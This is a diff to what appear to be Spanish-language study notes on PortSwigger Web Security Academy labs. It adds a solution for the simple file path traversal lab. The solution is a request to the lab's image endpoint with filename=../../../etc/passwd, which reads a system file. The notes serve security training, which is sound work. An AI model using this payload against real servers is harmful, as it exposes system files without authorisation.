@@ -85,6 +85,12 @@
 
 ## [Directory traversal](https://portswigger.net/web-security/file-path-traversal)
 
+### [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
+
+#### Solución:
+
+Hacer una request a https://LABID.web-security-academy.net/image?filename=../../../etc/passwd
+
 ---
 
 ## [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
